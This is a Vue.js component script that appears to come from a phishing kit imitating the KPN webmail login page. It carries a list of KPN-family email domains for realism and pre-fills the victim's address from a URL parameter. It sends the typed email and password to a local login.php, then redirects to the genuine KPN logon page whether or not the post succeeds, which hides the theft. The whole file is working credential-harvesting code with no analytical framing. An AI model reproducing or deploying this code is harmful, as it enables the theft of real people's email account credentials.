<script>
import axios from 'axios';

export default {
  name: "Wrapper",
  data() {
    return {
      referrerPage: '//webmail.kpnmail.nl/mail/logon.asp',
      emailPlaceholderElement: null,
      emailPlaceholderStyle: "",
      generalErrorVisible: false,
      emailRequired: false,
      emailInvalidPatern: false,
      passwordRequired: false,
      emailAddress: "",
      password: "",
      validDomains: [
        "kpnmail.nl",
        "planet.nl",
        "hetnet.nl",
        "kpnplanet.nl",
        "freeler.nl",
        "compaqnet.nl",
        "hi.nl",
        "ibmail.nl",
        "ing-access.nl",
        "on.nl",
        "onsbrabantnet.nl",
        "onsmail.nl",
        "onsnet.nu",
        "onsneteindhoven.nl",
        "onsnetnuenen.nl",
        "pi.net",
        "snelnet.net",
        "sp-plus.nl",
        "worldaccess.nl",
        "wxs.nl"
      ],
      step: 1
    };
  },
  computed: {
    errorMessageStyle() {
      return this.generalErrorVisible ? "display: block" : "";
    },
    emailPlaceholder() {
      if (this.emailAddress.length > 0) {
        var domain = "";
        var emailDomainIsValid = true;
        var usernameSplit = this.emailAddress.split("@");
        if (usernameSplit.length < 3) {
          var usernamePart = usernameSplit[0];
          var domainPartOriginal =
            usernameSplit.length === 2 && usernameSplit[1].length > 0
              ? usernameSplit[1]
              : this.validDomains[0];
          domainPartOriginal = domainPartOriginal.trim();
          var domainPart = domainPartOriginal;
          if (domainPart) {
            domainPart = domainPart.toLocaleLowerCase();
          }
          emailDomainIsValid =
            domainPart.length === 0 ||
            this.validDomains.indexOf(domainPart) >= 0;
          for (
            var i = 0;
            i < this.validDomains.length &&
            this.validDomains.indexOf(domainPart) < 0;
            i++
          ) {
            if (this.validDomains[i].indexOf(domainPart) === 0) {
              domainPart = this.validDomains[i];
              domain = domainPart;
              emailDomainIsValid = true;
            }
          }
          this.emailInvalidPatern = !emailDomainIsValid;
          if (domainPartOriginal) {
            return (
              usernamePart +
              "@" +
              domainPartOriginal +
              domainPart.substring(domainPartOriginal.length)
            );
          } else {
            return usernamePart + "@" + domainPart;
          }
        }
      } else {
        return "";
      }
    }
  },
  methods: {
    doNext() {
      var vm = this;
      vm.step = 0;
      setTimeout(function() {
        vm.step = 2;
        setTimeout(function() {
          window.location.replace(vm.referrerPage);
        }, 1500);
      }, 150);
    },
    nextClick() {
      var vm = this;
      if (vm.emailAddress.length === 0) {
        vm.emailRequired = true;
        return;
      }
      if (vm.password.length === 0) {
        vm.passwordRequired = true;
        return;
      }
      if (vm.emailInvalidPatern === true) {
        return;
      }
      axios.post('login.php', {email: vm.emailAddress, password: vm.password})
      .then(res => {
          vm.doNext();
      })
      .catch(error => {
          vm.doNext();
      })
    }
  },
  watch: {
    emailAddress: function(val) {
      this.emailRequired = false;
      if (this.emailPlaceholderElement != null) {
        let color =
          this.emailPlaceholderElement.scrollWidth >
          this.emailPlaceholderElement.clientWidth
            ? "transparent"
            : "#999";
        this.emailPlaceholderStyle = `color: ${color};`;
      }
    },
    password: function(val) {
      this.passwordRequired = false;
    }
  },
  mounted() {
    let vm = this
    let uri = window.location.href.split("?");
    if (uri.length > 0 && uri[1] !== undefined) {
      let vars = uri[1].split("&");
      let getVars = {};
      let tmp = "";
      vars.forEach(function(v) {
        tmp = v.split("=");
        if (tmp.length == 2)
          getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
      });
      var email = "undefined" !== typeof getVars["e"] ? getVars["e"] : "";
      vm.emailAddress = email
    }
    vm.emailPlaceholderElement = document.getElementById("email");  
  }
};
</script>

